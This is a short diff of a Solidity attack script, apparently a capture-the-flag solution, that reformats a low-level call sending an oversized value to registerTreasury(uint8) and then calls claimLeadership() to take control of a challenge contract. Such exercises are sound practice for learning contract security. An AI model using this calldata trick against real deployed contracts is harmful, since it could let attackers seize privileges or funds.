@@ -29,12 +29,7 @@ contract StakeScript is Script {
 
         console.log("Starting Hacking");
 
-        highOrder.call(
-            abi.encodeWithSignature(
-                "registerTreasury(uint8)",
-                bytes32(uint256(100000))
-            )
-        );
+        highOrder.call(abi.encodeWithSignature("registerTreasury(uint8)", bytes32(uint256(100000))));
 
         highOrder.call(abi.encodeWithSignature("claimLeadership()"));
 
